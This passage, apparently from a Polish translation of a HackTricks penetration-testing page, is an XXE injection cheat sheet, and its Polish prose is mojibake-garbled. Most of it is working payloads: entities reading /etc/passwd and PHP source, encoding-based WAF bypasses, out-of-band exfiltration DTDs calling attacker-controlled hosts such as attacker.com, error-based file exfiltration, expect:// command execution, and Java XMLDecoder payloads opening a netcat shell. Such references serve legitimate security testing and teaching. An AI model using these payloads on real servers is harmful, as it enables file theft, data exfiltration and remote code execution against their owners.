JeÅ›li Å¼Ä…danie POST akceptuje dane w formacie XML, moÅ¼esz sprÃ³bowaÄ‡ wykorzystaÄ‡ XXE w tym Å¼Ä…daniu. Na przykÅ‚ad, jeÅ›li normalne Å¼Ä…danie zawiera nastÄ™pujÄ…ce:
```xml
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar
```
Wtedy moÅ¼esz byÄ‡ w stanie zÅ‚oÅ¼yÄ‡ nastÄ™pujÄ…ce Å¼Ä…danie, z tym samym wynikiem:
```xml
POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
```
### Content-Type: Z JSON do XEE

Aby zmieniÄ‡ Å¼Ä…danie, moÅ¼esz uÅ¼yÄ‡ rozszerzenia Burp o nazwie â€œ**Content Type Converter**â€œ. [Tutaj](https://exploitstube.com/xxe-for-fun-and-profit-converting-json-request-to-xml.html) znajdziesz ten przykÅ‚ad:
```xml
Content-Type: application/json;charset=UTF-8

{"root": {"root": {
"firstName": "Avinash",
"lastName": "",
"country": "United States",
"city": "ddd",
"postalCode": "ddd"
}}}
```

```xml
Content-Type: application/xml;charset=UTF-8

<?xml version="1.0" encoding="UTF-8" standalone="no"?>
<!DOCTYPE testingxxe [<!ENTITY xxe SYSTEM "http://34.229.92.127:8000/TEST.ext" >]>
<root>
<root>
<firstName>&xxe;</firstName>
<lastName/>
<country>United States</country>
<city>ddd</city>
<postalCode>ddd</postalCode>
</root>
</root>
```
Inny przykÅ‚ad moÅ¼na znaleÅºÄ‡ [tutaj](https://medium.com/hmif-itb/googlectf-2019-web-bnv-writeup-nicholas-rianto-putra-medium-b8e2d86d78b2).

## ObejÅ›cia WAF i zabezpieczeÅ„

### Base64
```xml
<!DOCTYPE test [ <!ENTITY % init SYSTEM "data://text/plain;base64,ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>
```
To dziaÅ‚a tylko wtedy, gdy serwer XML akceptuje protokÃ³Å‚ `data://`.

### UTF-7

MoÅ¼esz uÅ¼yÄ‡ \[**"Encode Recipe**" z cyberchef tutaj ]\(\[[https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7) %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4)do]\([https://gchq.github.io/CyberChef/#recipe=Encode\_text%28'UTF-7 %2865000%29'%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29do](https://gchq.github.io/CyberChef/#recipe=Encode\_text%28%27UTF-7%20%2865000%29%27%29\&input=PCFET0NUWVBFIGZvbyBbPCFFTlRJVFkgZXhhbXBsZSBTWVNURU0gIi9ldGMvcGFzc3dkIj4gXT4KPHN0b2NrQ2hlY2s%2BPHByb2R1Y3RJZD4mZXhhbXBsZTs8L3Byb2R1Y3RJZD48c3RvcmVJZD4xPC9zdG9yZUlkPjwvc3RvY2tDaGVjaz4%29do)) do transformacji na UTF-7.
```xml
<!xml version="1.0" encoding="UTF-7"?-->
+ADw-+ACE-DOCTYPE+ACA-foo+ACA-+AFs-+ADw-+ACE-ENTITY+ACA-example+ACA-SYSTEM+ACA-+ACI-/etc/passwd+ACI-+AD4-+ACA-+AF0-+AD4-+AAo-+ADw-stockCheck+AD4-+ADw-productId+AD4-+ACY-example+ADs-+ADw-/productId+AD4-+ADw-storeId+AD4-1+ADw-/storeId+AD4-+ADw-/stockCheck+AD4-
```

```xml
<?xml version="1.0" encoding="UTF-7"?>
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4
```
### File:/ Protocol Bypass

JeÅ›li strona uÅ¼ywa PHP, zamiast uÅ¼ywaÄ‡ `file:/` moÅ¼esz uÅ¼yÄ‡ **php wrappers**`php://filter/convert.base64-encode/resource=` aby **uzyskaÄ‡ dostÄ™p do plikÃ³w wewnÄ™trznych**.

JeÅ›li strona uÅ¼ywa Javy, moÅ¼esz sprawdziÄ‡ [**jar: protocol**](xxe-xee-xml-external-entity.md#jar-protocol).

### HTML Entities

Sztuczka z [**https://github.com/Ambrotd/XXE-Notes**](https://github.com/Ambrotd/XXE-Notes)\
MoÅ¼esz stworzyÄ‡ **encjÄ™ wewnÄ…trz encji** kodujÄ…c jÄ… za pomocÄ… **html entities** i nastÄ™pnie wywoÅ‚aÄ‡ jÄ…, aby **zaÅ‚adowaÄ‡ dtd**.\
ZauwaÅ¼, Å¼e uÅ¼ywane **HTML Entities** muszÄ… byÄ‡ **numeryczne** (jak \[w tym przykÅ‚adzie]\([https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,'Numeric entities'%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B)\\](https://gchq.github.io/CyberChef/#recipe=To\_HTML\_Entity%28true,%27Numeric%20entities%27%29\&input=PCFFTlRJVFkgJSBkdGQgU1lTVEVNICJodHRwOi8vMTcyLjE3LjAuMTo3ODc4L2J5cGFzczIuZHRkIiA%2B\)%5C)).
```xml
<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % a "&#x3C;&#x21;&#x45;&#x4E;&#x54;&#x49;&#x54;&#x59;&#x25;&#x64;&#x74;&#x64;&#x53;&#x59;&#x53;&#x54;&#x45;&#x4D;&#x22;&#x68;&#x74;&#x74;&#x70;&#x3A;&#x2F;&#x2F;&#x6F;&#x75;&#x72;&#x73;&#x65;&#x72;&#x76;&#x65;&#x72;&#x2E;&#x63;&#x6F;&#x6D;&#x2F;&#x62;&#x79;&#x70;&#x61;&#x73;&#x73;&#x2E;&#x64;&#x74;&#x64;&#x22;&#x3E;" >%a;%dtd;]>
<data>
<env>&exfil;</env>
</data>
```
DTD przykÅ‚ad:
```xml
<!ENTITY % data SYSTEM "php://filter/convert.base64-encode/resource=/flag">
<!ENTITY % abt "<!ENTITY exfil SYSTEM 'http://172.17.0.1:7878/bypass.xml?%data;'>">
%abt;
%exfil;
```
## PHP Wrappers

### Base64

**WyodrÄ™bnij** _**index.php**_
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php"> ]>
```
#### **Ekstrakcja zewnÄ™trznego zasobu**
```xml
<!DOCTYPE replace [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=http://10.0.0.3"> ]>
```
### Remote code execution

**JeÅ›li moduÅ‚ PHP "expect" jest zaÅ‚adowany**
```xml
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [ <!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "expect://id" >]>
<creds>
<user>&xxe;</user>
<pass>mypass</pass>
</creds>
```
## **SOAP - XEE**
```xml
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
```
## XLIFF - XXE

Ten przykÅ‚ad jest inspirowany [https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe](https://pwn.vg/articles/2021-06/local-file-read-via-error-based-xxe)

XLIFF (XML Localization Interchange File Format) jest wykorzystywany do standaryzacji wymiany danych w procesach lokalizacji. Jest to format oparty na XML, gÅ‚Ã³wnie uÅ¼ywany do transferu danych lokalizacyjnych miÄ™dzy narzÄ™dziami podczas lokalizacji oraz jako wspÃ³lny format wymiany dla narzÄ™dzi CAT (Computer-Aided Translation).

### Analiza Å»Ä…dania Blind

Å»Ä…danie jest wysyÅ‚ane do serwera z nastÄ™pujÄ…cÄ… treÅ›ciÄ…:
```xml
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://redacted.burpcollaborator.net/?xxe_test"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
JednakÅ¼e, to Å¼Ä…danie wywoÅ‚uje bÅ‚Ä…d wewnÄ™trznego serwera, konkretnie wspominajÄ…c o problemie z deklaracjami znacznikÃ³w:
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
Mimo bÅ‚Ä™du, rejestruje siÄ™ trafienie w Burp Collaborator, co wskazuje na pewien poziom interakcji z zewnÄ™trznÄ… jednostkÄ….

Out of Band Data Exfiltration Aby wyeksfiltrowaÄ‡ dane, wysyÅ‚ane jest zmodyfikowane Å¼Ä…danie:
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
To podejÅ›cie ujawnia, Å¼e User Agent wskazuje na uÅ¼ycie Java 1.8. ZauwaÅ¼onÄ… ograniczeniem tej wersji Java jest niemoÅ¼noÅ›Ä‡ pobrania plikÃ³w zawierajÄ…cych znak nowej linii, takich jak /etc/passwd, przy uÅ¼yciu techniki Out of Band.

Ekstrakcja danych oparta na bÅ‚Ä™dach Aby przezwyciÄ™Å¼yÄ‡ to ograniczenie, stosuje siÄ™ podejÅ›cie oparte na bÅ‚Ä™dach. Plik DTD jest skonstruowany w nastÄ™pujÄ…cy sposÃ³b, aby wywoÅ‚aÄ‡ bÅ‚Ä…d, ktÃ³ry zawiera dane z docelowego pliku:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
Serwer odpowiada bÅ‚Ä™dem, co waÅ¼ne, odzwierciedlajÄ…c nieistniejÄ…cy plik, wskazujÄ…c, Å¼e serwer prÃ³buje uzyskaÄ‡ dostÄ™p do okreÅ›lonego pliku:
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
Aby uwzglÄ™dniÄ‡ zawartoÅ›Ä‡ pliku w komunikacie o bÅ‚Ä™dzie, plik DTD jest dostosowywany:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
Ta modyfikacja prowadzi do udanej eksfiltracji zawartoÅ›ci pliku, co jest odzwierciedlone w komunikacie o bÅ‚Ä™dzie wysÅ‚anym przez HTTP. Wskazuje to na udany atak XXE (XML External Entity), wykorzystujÄ…cy zarÃ³wno techniki Out of Band, jak i Error-Based do wydobycia wraÅ¼liwych informacji.

## RSS - XEE

Poprawny XML w formacie RSS do wykorzystania luki XXE.

### Ping back

ProÅ›ba HTTP do serwera atakujÄ…cego
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Odczytaj plik
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### Przeczytaj kod ÅºrÃ³dÅ‚owy

UÅ¼ywajÄ…c filtru base64 w PHP
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE do RCE

XMLDecoder to klasa Java, ktÃ³ra tworzy obiekty na podstawie wiadomoÅ›ci XML. JeÅ›li zÅ‚oÅ›liwy uÅ¼ytkownik zdoÅ‚a skÅ‚oniÄ‡ aplikacjÄ™ do uÅ¼ycia dowolnych danych w wywoÅ‚aniu metody **readObject**, natychmiast uzyska wykonanie kodu na serwerze.

### UÅ¼ywanie Runtime().exec()
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder
```xml
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## NarzÄ™dzia

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## Odniesienia

* [https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\\
* [https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\\
* WyciÄ…gnij informacje przez HTTP uÅ¼ywajÄ…c wÅ‚asnego zewnÄ™trznego DTD: [https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\\
* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\\
* [https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\\
* [https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\\
* [https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\\
* [https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Ucz siÄ™ i Ä‡wicz Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Ucz siÄ™ i Ä‡wicz Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Wsparcie dla HackTricks</summary>

* SprawdÅº [**plany subskrypcyjne**](https://github.com/sponsors/carlospolop)!
* **DoÅ‚Ä…cz do** ğŸ’¬ [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **Å›ledÅº** nas na **Twitterze** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Dziel siÄ™ trikami hackingowymi, przesyÅ‚ajÄ…c PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repozytoriÃ³w na GitHubie.

</details>
{% endhint %}
